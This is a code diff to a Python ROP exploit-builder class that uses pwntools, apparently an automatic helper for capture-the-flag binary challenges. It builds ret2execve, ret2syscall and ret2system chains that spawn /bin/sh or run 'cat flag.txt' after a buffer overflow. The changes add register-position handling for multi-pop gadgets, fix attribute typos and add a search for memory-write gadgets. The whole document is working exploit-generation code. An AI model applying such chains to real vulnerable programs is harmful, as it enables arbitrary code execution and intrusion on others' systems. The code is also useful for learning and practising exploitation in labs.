@@ -11,6 +11,8 @@ class ROP:
         self.offset = self.set_offset()
         self.e = ELF(self.filename)
         self.gadgets = []
+        self.find_gadgets()
+
     
     def build_exploit(self):
         payload = None
@@ -47,7 +49,6 @@ class ROP:
         return payload
 
     def ret2execve(self):
-        self.find_gadgets()         
         payload = cyclic(self.offset)
         payload += self.fill_reg("rdi", self.analysis.get_binsh())
         payload += self.fill_reg("rsi", 0)
@@ -57,7 +58,6 @@ class ROP:
         return payload
 
     def ret2syscall(self):
-        self.find_gadgets()
         payload = cyclic(self.offset)
         payload += self.fill_reg("rax", 59)
         payload += self.fill_reg("rdi", self.analysis.get_binsh())
@@ -68,7 +68,6 @@ class ROP:
         return payload
     
     def ret2system(self):
-        self.find_gadgets()
         payload = cyclic(self.offset)
         if self.analysis.has_catflagtxt():
             payload += self.fill_reg("rdi", self.analysis.get_catflagtxt())
@@ -96,20 +95,38 @@ class ROP:
 
     def num_pops(self, string):
         return string.count('pop')
+
+    def reg_pos(self, reg, gad):
+        out = []
+        gad = gad.split(' ')
+        registers = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'rbp', 'rsp', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']
+        for i in gad:
+            if i.strip(';') in registers:
+                out.append(i.strip(';'))
+        return out.index(reg)
+
     
     def pop_reg(self, reg):
         for i in self.get_pops():
             if ': pop ' + reg + "; ret;" in i:
-                return [i.split(":")[0], 1]
+                return [i.split(":")[0], 1, self.reg_pos(reg, i)]
             elif "pop " + reg in i:
-                return [i.split(":")[0], self.num_pops(i)]
-    
+                return [i.split(":")[0], self.num_pops(i), self.reg_pos(reg, i)]
+
+
     def fill_reg(self, reg, val):
+        if isinstance(val, int):
+            val = p64(int(val))
+        elif isinstance(val, str):
+            val = val.encode('utf-8')
         chain = p64(int(self.pop_reg(reg)[0], 16))
         for i in range(self.pop_reg(reg)[1]):
-            chain += p64(int(val))
-
+            if i == (self.pop_reg(reg)[2]):
+                chain += val
+            else:
+                chain += p64(0)
         return chain
+
 
     def get_syscall(self):
         for i in self.gadgets:
@@ -118,10 +135,16 @@ class ROP:
         return None
     
     def realign(self):
-        return p64(self.analyze.get_fini())
+        return p64(self.analysis.get_fini())
 
     def satisfy_win(self):
-        return self.fill_reg("rdi", int(self.analyze.get_win_arg(), 16))
+        return self.fill_reg("rdi", int(self.analysis.get_win_arg(), 16))
+    
+    def get_primitives(self):
+        print("inside get prim")
+        for i in self.gadgets:
+            if 'mov qword ptr [' in i:
+                print(i)
 
 class Get2overflow:
     def __init__(s, binary):
